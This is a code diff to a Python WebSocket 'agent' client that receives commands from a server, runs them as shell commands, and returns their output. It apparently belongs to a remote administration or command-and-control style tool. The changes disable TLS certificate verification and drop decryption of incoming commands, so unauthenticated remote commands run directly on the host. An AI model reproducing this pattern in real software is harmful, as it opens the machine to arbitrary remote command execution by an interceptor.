@@ -605,23 +605,19 @@ class WebSocketClient:
 
     def connect(self):
         try:
-            self.socket = socketio.Client()
-            self.socket.connect(self.server_url)
-            self.socket.emit('agent_connect', {
-                'agent_id': self.agent_id,
-                'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
-            })
+            self.socket = socketio.Client(ssl_verify=False)
             
             @self.socket.on('command')
             def handle_command(data):
                 try:
-                    decrypted = self.crypto.decrypt(data['encrypted'])
-                    command = decrypted['command']
-                    
-                    result = self._execute_command(command)
+                    result = self._execute_command(data['command'])
                     self.socket.emit('command_result', {
                         'agent_id': self.agent_id,
-                        'encrypted': self.crypto.encrypt(result)
+                        'command': data['command'],
+                        'output': result.get('output', ''),
+                        'error': result.get('error', ''),
+                        'current_dir': result.get('current_dir', ''),
+                        'status': result.get('status', 'error')
                     })
                 except Exception as e:
                     self.socket.emit('command_error', {
@@ -629,6 +625,16 @@ class WebSocketClient:
                         'error': str(e)
                     })
 
+            @self.socket.on('disconnect')
+            def handle_disconnect():
+                self.running = False
+
+            self.socket.connect(self.server_url)
+            self.socket.emit('agent_connect', {
+                'agent_id': self.agent_id,
+                'auth_token': self.crypto.encrypt({'agent_id': self.agent_id})
+            })
+            
             self.running = True
             return True
         except Exception as e:
@@ -662,7 +668,8 @@ class WebSocketClient:
                 cwd=self.current_dir,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True
+                text=True,
+                timeout=30
             )
 
             self.current_dir = os.getcwd()
@@ -670,6 +677,12 @@ class WebSocketClient:
                 'status': 'success',
                 'output': result.stdout,
                 'error': result.stderr,
+                'current_dir': self.current_dir
+            }
+        except subprocess.TimeoutExpired:
+            return {
+                'status': 'error',
+                'error': 'Command timed out after 30 seconds',
                 'current_dir': self.current_dir
             }
         except Exception as e:
